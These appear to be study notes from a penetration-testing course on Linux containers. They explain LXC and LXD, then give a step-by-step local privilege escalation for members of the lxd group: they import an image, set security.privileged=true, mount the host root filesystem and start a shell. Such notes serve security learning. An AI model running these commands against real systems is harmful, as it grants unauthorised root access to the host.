## Table of Contents

  - [Table of Contents](#Table\of\Contents)
  - [Table of Contents](#Table\of\Contents)
- [Linux Containers (LXC)](#linux\containers\(lxc))
  - [Linux Daemon](#Linux\Daemon)

## Table of Contents

  - [Table of Contents](#Table\of\Contents)
- [Linux Containers (LXC)](#linux\containers\(lxc))
  - [Linux Daemon](#Linux\Daemon)

## Table of Contents

- [Linux Containers (LXC)](#linux\containers\(lxc))
  - [Linux Daemon](#Linux\Daemon)

Containers operate the operating system level and virtual machines at the hardware level. Containers thus share an operating system and isolate application processes from the rest of the system, while classic virtualization allows multiple operating systems to runs simultaneously on a single system

Isolation and virtualization are essential because they help to manage resources and security aspects as efficiently as possible. Ex: They facilitate monitoring to find errors in the system that often have nothing to do with newly developed applications. Another example would be the isolation of processes that usually require root privileges. This could be a web application or API that must be isolated from the host system to prevent escalation to databases.

# Linux Containers (LXC)
`LXC` is an operating system-level virtualization technique that allows multiple Linux systems to run in isolation from each other on a single host by owning their own processes but sharing the host system kernel for them. LXC is very popular due to its ease of use and has become an essential part of IT security

- By default `LXC` consumes fewer resources than a virtual machine and have a standard interface, making it easy to manage multiple containers simultaneously.
- A platform with `LXC` can even be organized across multiple clouds, providing portability and ensuring that applications running correctly on the developer's system will work on any other system. Additonally, large applications can be started, stopped, or their environment variables changes via the Linux Container interface.
- The ease of use of `LXC` is their most significant advantage compared to classic cirtualization techniques. However, the enormous spread of `LXC` resulted in the created of tools such as `Docker`, which established Linux Containers. The entire setup, from creating container templates and deploying them, configuring the operating system and networking, to deploying applications, remains the same.

## Linux Daemon
`LXD` is similar in some respects but is designed to contain a complete operating system. Thus it's not an application container. Before we can use this service to escalate our privileges, we must be either the `lxc` or `lxd` group. We can find this out with the following:
```bash
$ id

```
From here on, there are now several ways in which we can exploit `LXC`/`LXD`. We can either create our own container and transfer it to the target system or use an existing container.

Unfortunately, administrators often use templates that have little to no security. This attitude has the consequence that we already have tools that we can use against the system ourselves.

Linux Daemon

```shell-session
container-user@nix02:~$ cd ContainerImages
container-user@nix02:~$ ls
```

- Often, templates do not have passwords, especially if they are uncomplicated test environments. These should be quickly accessible and uncomplicated to use. The focus on security would complicate the whole initiation, making it more difficult and thus slow it down considerably. 
```bash

lxc image import ubuntu-template.tar.xz --alias ubuntutemp
lxc image list
```

After verifying that this image has been successfully imported, we can initiate the image and configure it by specifying the `security.privileged` flag and the root path for the container. This flag disables all isolation features that allow us to act on the host.

```bash
lxc init ubuntuemp privesc -c security.privileged=true

lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```

- Once we have configured/initiated the imaged with the `security.privileged` flag and the root path for the container. This flag disables all isolation features that allow us to act on the host

```bash
lxc start privesc

lxc exec privesc /bin/bash

ls -l /mnt/root
```





























